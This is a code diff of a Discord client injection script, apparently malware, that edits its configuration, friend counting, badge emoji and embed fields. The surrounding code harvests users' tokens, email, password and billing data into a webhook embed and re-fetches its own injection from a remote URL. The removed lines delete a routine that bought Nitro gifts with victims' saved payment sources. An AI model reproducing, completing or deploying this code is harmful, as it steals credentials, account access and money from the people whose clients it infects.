@@ -7,40 +7,15 @@ const { BrowserWindow, session } = require('electron');
 
 const config = {
   webhook: '%WEBHOOK%', 
-  ip: '%IP%', 
-  webhook_protector_key: '%WEBHOOK_KEY%', 
+  ip: '%IP%',
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'BulkFA', 
-  embed_icon: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 000000, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js', //injection url for when it reinjects
-  /**
-   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
-   **/
+  embed_icon: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+  embed_color: 000000, 
+  injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
-  nitro: {
-    boost: {
-      year: {
-        id: '521847234246082599',
-        sku: '511651885459963904',
-        price: '9999',
-      },
-      month: {
-        id: '521847234246082599',
-        sku: '511651880837840896',
-        price: '999',
-      },
-    },
-    classic: {
-      month: {
-        id: '521846918637420545',
-        sku: '511651871736201216',
-        price: '499',
-      },
-    },
-  },
   filter: {
     urls: [
       'https://discord.com/api/v*/users/@me',
@@ -514,7 +489,7 @@ const getBilling = async (token) => {
 
 const fetchFriends = async (token) => {
   const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
-    xmlHttp.open("GET", "https://discord.com/api/v6/users/@me/relationships", false); 
+    xmlHttp.open("GET", "${config.api}/relationships", false); 
     xmlHttp.setRequestHeader("Authorization", "${token}"); 
     xmlHttp.send(null); 
     xmlHttp.responseText`);
@@ -523,79 +498,32 @@ const fetchFriends = async (token) => {
 };
 
 const getFriends = async (token) => {
-  let s = 0;
   const data = await fetchFriends(token);
+  let s = 0;
+  let k = 0;
   data.forEach((x) => {
-    if (x['type'] ==1) {
-      s+=1;
+    if (!x.invalid) {
+      switch (x.type) {
+        case 1:
+          s += 1;
+        case 2:
+          k += 1;
+      }
     }
   });
   return s;
 };
 
-const Purchase = async (token, id, _type, _time) => {
-  const options = {
-    expected_amount: config.nitro[_type][_time]['price'],
-    expected_currency: 'usd',
-    gift: true,
-    payment_source_id: id,
-    payment_source_token: null,
-    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
-    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
-  };
-
-  const req = execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.setRequestHeader('Content-Type', 'application/json');
-    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
-    xmlHttp.responseText`);
-  if (req['gift_code']) {
-    return 'https://discord.gift/' + req['gift_code'];
-  } else return null;
-};
-
-const buyNitro = async (token) => {
-  const data = await fetchBilling(token);
-  const failedMsg = 'Failed to Purchase ❌';
-  if (!data) return failedMsg;
-
-  let IDS = [];
-  data.forEach((x) => {
-    if (!x.invalid) {
-      IDS = IDS.concat(x.id);
-    }
-  });
-  for (let sourceID in IDS) {
-    const first = Purchase(token, sourceID, 'boost', 'year');
-    if (first !== null) {
-      return first;
-    } else {
-      const second = Purchase(token, sourceID, 'boost', 'month');
-      if (second !== null) {
-        return second;
-      } else {
-        const third = Purchase(token, sourceID, 'classic', 'month');
-        if (third !== null) {
-          return third;
-        } else {
-          return failedMsg;
-        }
-      }
-    }
-  }
-};
-
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return 'No Nitro';
+      return '';
     case 1:
-      return 'Nitro Classic';
+      return '<:nitro:892130462024224838> ';
     case 2:
-      return 'Nitro Boost';
+      return '<:nitro:892130462024224838> ';
     default:
-      return 'No Nitro';
+      return '';
   }
 };
 
@@ -609,10 +537,10 @@ const getBadges = (flags) => {
       badges += 'Partnered Server Owner, ';
       break;
     case 131072:
-      badges += 'Discord Developer, ';
+      badges += ' <:DevBadge:912727453875699733> ';
       break;
     case 4:
-      badges += 'Hypesquad Event, ';
+      badges += ' <a:CH_IconHypesquadShiny:928551747591487548> ';
       break;
     case 16384:
       badges += 'Gold BugHunter, ';
@@ -621,16 +549,16 @@ const getBadges = (flags) => {
       badges += 'Green BugHunter, ';
       break;
     case 512:
-      badges += 'Early Supporter, ';
+      badges += ' <a:early:913099122968494170> ';
       break;
     case 128:
-      badges += 'HypeSquad Brillance, ';
+      badges += ' <:brilliance:919973089285120111> ';
       break;
     case 64:
-      badges += 'HypeSquad Bravery, ';
+      badges += ' <:bravery:919973089222205451> ';
       break;
     case 256:
-      badges += 'HypeSquad Balance, ';
+      badges += ' <:balance:919973088651776001> ';
       break;
     case 0:
       badges = '`No Badges`';
@@ -674,7 +602,6 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
-  const friends = await getFriends(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -698,8 +625,8 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<:944081229207175199:959785231999721472> Friends:',
-            value: `\`${friends}\``,
+            name: '<:944007233820307467:959785232037470208> Friends:',
+            value: `\`${config.friends}\``,
             inline: true,
           },
           {
